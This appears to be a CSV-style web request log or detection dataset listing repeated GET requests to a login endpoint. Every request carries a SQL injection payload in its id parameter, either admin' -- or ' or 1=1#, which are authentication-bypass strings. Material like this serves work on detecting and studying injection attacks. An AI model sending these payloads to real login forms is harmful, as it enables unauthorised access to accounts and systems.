32,1,200,5782,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2377,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5110,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3450,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3494,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7234,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4721,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2930,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2623,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2964,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6597,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5712,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6092,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7003,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5767,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5229,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1315,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3952,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4032,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5641,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3048,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3353,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5443,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3671,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3652,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6762,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7829,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7073,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7427,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4977,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
